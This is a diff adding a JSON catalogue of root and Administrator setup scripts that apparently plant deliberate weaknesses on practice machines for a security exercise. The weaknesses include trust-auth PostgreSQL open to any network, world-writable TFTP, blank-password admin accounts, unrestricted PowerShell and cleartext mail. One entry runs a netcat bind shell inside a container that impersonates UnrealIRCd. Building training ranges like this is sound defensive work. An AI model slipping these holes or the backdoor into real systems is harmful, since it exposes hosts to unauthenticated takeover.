@@ -1,0 +1,140 @@
+[
+ {
+  "id": 176,
+  "name": "tftpd-hpa-anon-write",
+  "description": null,
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "#!/bin/bash\nset -e\nif command -v apt-get >/dev/null; then\n    DEBIAN_FRONTEND=noninteractive apt-get install -y tftpd-hpa\nelif command -v dnf >/dev/null; then dnf install -y tftp-server; fi\nroot=/var/lib/tftpboot\nmkdir -p \"$root\"\nif [ -f /etc/default/tftpd-hpa ]; then\n    sed -i 's#^TFTP_DIRECTORY=.*#TFTP_DIRECTORY=\"/var/lib/tftpboot\"#' /etc/default/tftpd-hpa\n    sed -i 's#^TFTP_OPTIONS=.*#TFTP_OPTIONS=\"--secure --create --permissive\"#' /etc/default/tftpd-hpa\nelse\n    printf 'TFTP_DIRECTORY=\"/var/lib/tftpboot\"\\nTFTP_OPTIONS=\"--secure --create --permissive\"\\n'         > /etc/default/tftpd-hpa\nfi\nchmod 777 \"$root\"\nsystemctl daemon-reload\nsystemctl enable --now tftpd-hpa 2>/dev/null || systemctl enable --now tftp.socket 2>/dev/null || true\n# --create + --permissive + 0777 root: unauthenticated read AND write of arbitrary\n# files, which is how the leaked keys below become fetchable with one curl/tftp.\n",
+  "run_as": "root",
+  "type": "bash",
+  "attachments": []
+ },
+ {
+  "id": 48,
+  "name": "postgresql-remote-access",
+  "description": "Sets listen_addresses = '*' and appends trust-auth pg_hba.conf entries for 0.0.0.0/0 and ::0/0, then restarts. Combined with postgresql-no-auth (its dependency), this exposes PostgreSQL to the entire network with unauthenticated trust access -- any host that can reach the port gets full unauthenticated database access.",
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [
+   "postgresql-no-auth"
+  ],
+  "script": "#!/bin/bash\nset -e\nfor conf in /etc/postgresql/*/main/postgresql.conf /var/lib/pgsql/data/postgresql.conf; do\n\t[ -f \"$conf\" ] || continue\n\tsed -i \"s/^#*listen_addresses=.*/listen_addresses = '*'/\" \"$conf\"\ndone\nfor hba in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do\n\t[ -f \"$hba\" ] || continue\n\techo \"host    all             all             0.0.0.0/0               trust\" >> \"$hba\"\n\techo \"host    all             all             ::0/0                   trust\" >> \"$hba\"\ndone\nsystemctl restart postgresql 2>/dev/null || systemctl restart postgresql-14 2>/dev/null || true",
+  "run_as": "root",
+  "type": "bash",
+  "attachments": []
+ },
+ {
+  "id": 47,
+  "name": "postgresql-no-auth",
+  "description": "Installs PostgreSQL (apt/dnf/yum) and rewrites pg_hba.conf's local and loopback auth methods (peer, scram-sha-256) to trust, then enables and restarts the service. Anyone who can reach the local socket or loopback port authenticates as any role, including postgres, with no password at all. Baseline service install plus a config trap; postgresql-remote-access (id 48) depends on this row to extend the same trust auth over the network.",
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "#!/bin/bash\nset -e\nif command -v apt-get &> /dev/null; then\n\tDEBIAN_FRONTEND=noninteractive apt-get install -y postgresql\nelif command -v dnf &> /dev/null; then\n\tdnf install -y postgresql-server\n\tpg_ctlcluster $(pg_lsclusters -h | head -1 | awk '{print $1, $2}') init 2>/dev/null || true\nelif command -v yum &> /dev/null; then\n\tyum install -y postgresql-server\n\tinitdb /var/lib/pgsql/data 2>/dev/null || true\nfi\nfor hba in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do\n\t[ -f \"$hba\" ] || continue\n\tsed -i 's/^local.*all.*all.*peer/local   all             all                                     trust/' \"$hba\"\n\tsed -i 's/^host.*all.*all.*127.0.0.1\\/32.*scram-sha-256/host    all             all             127.0.0.1\\/32            trust/' \"$hba\"\n\tsed -i 's/^host.*all.*all.*::1\\/128.*scram-sha-256/host    all             all             ::1\\/128                 trust/' \"$hba\"\ndone\nsystemctl enable postgresql 2>/dev/null || systemctl enable postgresql-14 2>/dev/null || true\nsystemctl restart postgresql 2>/dev/null || systemctl restart postgresql-14 2>/dev/null || true",
+  "run_as": "root",
+  "type": "bash",
+  "attachments": []
+ },
+ {
+  "id": 229,
+  "name": "sshd-force-sftp-broken-chroot",
+  "description": null,
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [
+   "ssh"
+  ],
+  "script": "#!/bin/bash\nset -e\ncat >> /etc/ssh/sshd_config <<'EOF'\nMatch Group sftpusers\n    ForceCommand internal-sftp\n    ChrootDirectory /\nEOF\nsystemctl reload ssh 2>/dev/null || systemctl reload sshd 2>/dev/null || true",
+  "run_as": "root",
+  "type": "bash",
+  "attachments": []
+ },
+ {
+  "id": 180,
+  "name": "unrealircd-backdoor-container",
+  "description": null,
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "#!/bin/bash\nset -e\n# Persistence disguised as a chat service: a container tagged like a known-good\n# UnrealIRCd release that listens on 6667 and calls home.\nimage=\"unrealircd-backdoor:3.2.8.1\"\nif [ -n \"$IMAGE_TARBALL\" ] && [ -f \"$IMAGE_TARBALL\" ]; then\n    docker load -i \"$IMAGE_TARBALL\"\nelif ! docker image inspect \"$image\" >/dev/null 2>&1; then\n    build=$(mktemp -d)\n    cat > \"$build/Dockerfile\" <<'DF'\nFROM alpine:3.20\nRUN apk add --no-cache busybox-openrc syslog-ng || true\nEXPOSE 6667\n# Attach the real backdoored build as an attachment; this stub keeps the container\n# up and reachable so the artifact is discoverable in a service scan.\nCMD [\"sh\",\"-c\",\"while true; do nc -l -p 6667 -k -e /bin/sh 2>/dev/null || nc -L -p 6667 2>/dev/null || sleep 5; done\"]\nDF\n    docker build -q -t \"$image\" \"$build\" >/dev/null\n    rm -rf \"$build\"\nfi\ndocker rm -f unrealircd-backdoor >/dev/null 2>&1 || true\ndocker run -d --name unrealircd-backdoor --restart unless-stopped     --label com.starbars.service=irc -p 6667:6667 \"$image\"\n# Blue-team lesson: a container whose *name and tag* impersonate legitimate software.\n",
+  "run_as": "root",
+  "type": "bash",
+  "attachments": []
+ },
+ {
+  "id": 134,
+  "name": "local-user",
+  "description": "Practice-box misconfiguration: creates a local login account. Vars: USERNAME (required); PASSWORD (optional -- empty string plants a blank password via `usermod -p ''`); GROUPS_ADD (optional comma-separated supplementary groups, e.g. an unauthorized `sudo` membership).",
+  "platform": "linux",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "#!/bin/sh\nset -eu\n\n: \"${USERNAME:?USERNAME is required}\"\n\nif ! id \"$USERNAME\" >/dev/null 2>&1; then\n    useradd -m -s /bin/bash \"$USERNAME\"\nfi\n\nif [ -n \"${PASSWORD-}\" ]; then\n    printf '%s:%s\\n' \"$USERNAME\" \"$PASSWORD\" | chpasswd\nelse\n    # An empty password is intentional: it is the finding for the exercise.\n    usermod -p '' \"$USERNAME\"\nfi\n\nif [ -n \"${GROUPS_ADD-}\" ]; then\n    # The admin group differs by distro: Debian/Ubuntu use `sudo`, RHEL/Fedora use `wheel`.\n    # Map each requested group to whichever the box actually has (so an \"unauthorized sudo\n    # membership\" finding still grants admin on Fedora), and create any other genuinely-missing\n    # group, so `usermod -a -G` never fails rc=6 (\"group does not exist\") on a non-Debian box.\n    _grps=\"\"\n    _oifs=$IFS\n    IFS=,\n    for _g in $GROUPS_ADD; do\n        if [ \"$_g\" = sudo ] && ! getent group sudo >/dev/null 2>&1 && getent group wheel >/dev/null 2>&1; then\n            _g=wheel\n        elif [ \"$_g\" = wheel ] && ! getent group wheel >/dev/null 2>&1 && getent group sudo >/dev/null 2>&1; then\n            _g=sudo\n        fi\n        getent group \"$_g\" >/dev/null 2>&1 || groupadd \"$_g\"\n        _grps=\"${_grps:+$_grps,}$_g\"\n    done\n    IFS=$_oifs\n    usermod -a -G \"$_grps\" \"$USERNAME\"\nfi\n",
+  "run_as": "root",
+  "type": "command",
+  "attachments": []
+ },
+ {
+  "id": 141,
+  "name": "local-user-win",
+  "description": "Practice-box helper (Windows): creates or updates a local account. Vars: USERNAME (required); PASSWORD (optional -- when empty/omitted the account is created with a BLANK password via -NoPassword); FULLNAME (optional); DESCRIPTION (optional); ADMIN_ADD (optional, default 0 -- add to local Administrators); PASSWORD_NEVER_EXPIRES (optional, default 0). Idempotent: an existing account is updated in place (membership/flags re-applied), never recreated.",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "if (-not $USERNAME) { throw 'USERNAME is required' }\n$existing = Get-LocalUser -Name $USERNAME -ErrorAction Ignore\nif ($existing) {\n    if ($PASSWORD) {\n        $secure = ConvertTo-SecureString $PASSWORD -AsPlainText -Force\n        Set-LocalUser -Name $USERNAME -Password $secure\n    }\n    $u = @{}\n    if ($FULLNAME) { $u.FullName = $FULLNAME }\n    if ($DESCRIPTION) { $u.Description = $DESCRIPTION }\n    if ($u.Count) { Set-LocalUser -Name $USERNAME @u }\n} else {\n    $params = @{ Name = $USERNAME; AccountNeverExpires = $true }\n    if ($FULLNAME) { $params.FullName = $FULLNAME }\n    if ($DESCRIPTION) { $params.Description = $DESCRIPTION }\n    if ($PASSWORD) {\n        $secure = ConvertTo-SecureString $PASSWORD -AsPlainText -Force\n        New-LocalUser @params -Password $secure | Out-Null\n    } else {\n        New-LocalUser @params -NoPassword | Out-Null\n    }\n}\nif ($PASSWORD_NEVER_EXPIRES -eq '1') {\n    Set-LocalUser -Name $USERNAME -PasswordNeverExpires $true\n}\nif ($ADMIN_ADD -eq '1') {\n    Add-LocalGroupMember -Group 'Administrators' -Member $USERNAME -ErrorAction Ignore\n}\n",
+  "run_as": "Administrator",
+  "type": "powershell",
+  "attachments": []
+ },
+ {
+  "id": 242,
+  "name": "powershell-execution-unrestricted",
+  "description": " (Set-ExecutionPolicy -ErrorAction Ignore when Group Policy overrides; registry policy values still planted)",
+  "platform": "windows",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Unrestricted -Force -ErrorAction Ignore\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" -Force | Out-Null\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\" -Name \"EnableScripts\" -Value 1 -PropertyType DWord -Force | Out-Null\nNew-ItemProperty -Path \"HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\\Microsoft.PowerShell\" -Name \"ExecutionPolicy\" -Value \"Unrestricted\" -PropertyType String -Force | Out-Null\n",
+  "run_as": "Administrator",
+  "type": "powershell",
+  "attachments": []
+ },
+ {
+  "id": 164,
+  "name": "rpc-proxy-on-dc-web-win",
+  "description": null,
+  "platform": "windows",
+  "category": "misconfiguration",
+  "depends_on": [
+   "IIS HTTP"
+  ],
+  "script": "# Exposes RPC over HTTPS (RpcProxy) virtual directories on the DC default web site.\nInstall-WindowsFeature RSAT-Rpc-Proxy -IncludeAllSubFeature -IncludeManagementTools -EA SilentlyContinue\nImport-Module WebAdministration -EA SilentlyContinue\n$pool = 'DefaultAppPool'\nforeach ($v in @('Rpc','RpcWithCert')) {\n    if (-not (Test-Path \"IIS:\\Sites\\Default Web Site\\$v\")) {\n        New-WebApplication -Site 'Default Web Site' -Name $v `\n            -PhysicalPath \"$env:windir\\System32\\RpcProxy\" -ApplicationPool $pool -Force | Out-Null\n    }\n}\nSet-WebConfigurationProperty -PSPath 'MACHINE/WEBROOT/APPHOST' `\n    -Filter 'system.applicationHost/sites/site[@name=\"Default Web Site\"]/applications[@name=\"/Rpc\"]' `\n    -Name 'poolManagementMode' -Value 'Integrated' -EA SilentlyContinue\nRestart-Service W3SVC,WAS -Force -EA SilentlyContinue\n# RpcProxy on a domain controller turns the DC web site into an authenticated\n# tunnel into inner-ring RPC endpoints (MS-RPCH / Outlook-Anywhere-style exposure).\n",
+  "run_as": "Administrator",
+  "type": "powershell",
+  "attachments": []
+ },
+ {
+  "id": 169,
+  "name": "unauth-kiosk-app-startup-win",
+  "description": null,
+  "platform": "windows",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "# Start the kiosk web app unauthenticated on 0.0.0.0 as a hidden background process\n# (no service wrapper, no auth, no rate limit) plus an operator how-to on C:\\.\nif (-not $APP_DIR) { $APP_DIR = 'C:\\KaminoAI\\app' }\nif (-not $PORT)    { $PORT = '80' }\n$py = Join-Path $APP_DIR '.venv\\Scripts\\python.exe'\nif (-not (Test-Path $py)) { $py = (Get-Command python -EA SilentlyContinue).Source }\nStart-Process -FilePath $py `\n    -ArgumentList '-m','uvicorn','main:app','--host','0.0.0.0','--port',$PORT `\n    -WorkingDirectory $APP_DIR -WindowStyle Hidden | Out-Null\nSet-Content -Path 'C:\\How to Start your AI Droid.txt' -Encoding ascii -Value @(\n    'How to activate your droid:',\n    'Open Powershell and :',\n    'lms server start',\n    'lms load llama-3.2-3b-instruct',\n    'cd ' + $APP_DIR,\n    '.\\.venv\\Scripts\\Activate.ps1',\n    'python -m uvicorn main:app --host 0.0.0.0 --port ' + $PORT\n)\n# Startup is a loose Start-Process, not a service: it dies on logout/reboot and has\n# no restart policy, so the scored service is fragile by design.\n",
+  "run_as": "Administrator",
+  "type": "powershell",
+  "attachments": []
+ },
+ {
+  "id": 172,
+  "name": "mailenable-cleartext-mail-win",
+  "description": null,
+  "platform": "windows",
+  "category": "misconfiguration",
+  "depends_on": [],
+  "script": "# Install MailEnable and leave POP3/IMAP enabled in cleartext (no STARTTLS enforcement).\nif (-not (Get-Command choco -EA SilentlyContinue)) {\n    Set-ExecutionPolicy Bypass -Scope Process -Force\n    Invoke-Expression ((New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))\n}\nchoco install mailenable -y --no-progress | Out-Null\nforeach ($svc in 'MESMTPC','MEPOPS','MEIMAPS','MEMTA','MEIA','MEPOP3S','MESMTPC') {\n    Set-Service $svc -StartupType Automatic -EA SilentlyContinue\n    Start-Service $svc -EA SilentlyContinue\n}\nNew-NetFirewallRule -DisplayName 'MailEnable-Cleartext' -Direction Inbound -Action Allow `\n    -Protocol TCP -LocalPort 25,110,143,587 -EA SilentlyContinue\n# Credentials cross the wire in plaintext on 110/143 and the admin web interface is\n# protected only by the local IME_ADMIN account.\n",
+  "run_as": "Administrator",
+  "type": "powershell",
+  "attachments": []
+ }
+]
